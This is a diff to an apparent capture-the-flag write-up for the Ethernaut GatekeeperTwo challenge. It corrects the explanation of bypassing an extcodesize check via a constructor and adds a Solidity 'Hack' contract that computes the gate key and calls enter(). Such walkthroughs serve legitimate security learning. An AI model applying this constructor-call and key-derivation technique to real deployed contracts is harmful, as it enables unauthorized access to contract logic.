@@ -61,9 +61,7 @@ An inline assembly block is marked by `assembly { ... }`, where the code inside 
 
 `extcodesize(a)`: size of the code at address a
 
-What does `caller()` return in Yul when `DELEGATECALL` is used? It returns an empty number (0x000..0000).
-
-All that being said, we now know that **we can use a `DELEGATECALL` to force `caller()` to return a `extcodesize` of 0, fulfilling the requirements for `gateTwo()`.**
+While a contract is being deployed and the constructor function is running, `extcodesize` will have a size of 0, fulfilling the requirements for `gateTwo()`.**
 
 `gateThree()` requires us to construct a key of format bytes8 that has the following requirement:
 
@@ -90,8 +88,30 @@ b = 3;        // 0011
 Now that we know this, we know that we'll need to calculate a key that compliments whatever the result of `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` is. For example:
 
 ```
-result:    00101011
-key:       11010100
+result:    00101010 (042)
+key:       11010101 (213)
 
-combined:  11111111
+combined:  11111111 (255)
 ```
+
+As you may have guessed from this example, the compliment of any value (V) of bits(N) is equal to bits(N).max - (V). This means that for `gateThree()`, the `_gateKey` can be calculated as the difference between the `type(uint64).max`-`uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`. Let's put that logic in a smart contract.
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface GatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract Hack {
+    constructor(address _addr){
+        (bool success, ) = address(GatekeeperTwo(_addr)).call(
+            abi.encodeWithSignature("enter(bytes8)", bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1)))
+        );
+    }
+}
+```
+That's it, we're in!
+
+![Alt text](complete.jpg)
